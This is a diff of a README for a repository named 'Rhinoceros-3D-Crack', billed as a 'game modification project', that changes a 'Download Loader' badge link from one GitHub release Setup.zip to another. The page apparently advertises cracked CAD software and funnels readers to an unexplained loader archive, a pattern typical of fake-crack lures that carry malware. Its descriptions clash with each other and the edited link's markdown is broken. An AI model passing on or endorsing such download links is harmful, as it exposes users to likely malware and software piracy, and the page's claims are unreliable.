@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Rhinoceros-3D-Crack
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Rhinoceros-3D-Crack` · Updated: 2026-10-27
 
 **Tags:** `rhinoceros-3d` `rhino3d` `nurbs-modeling` `industrial-design` `3d-cad`
+
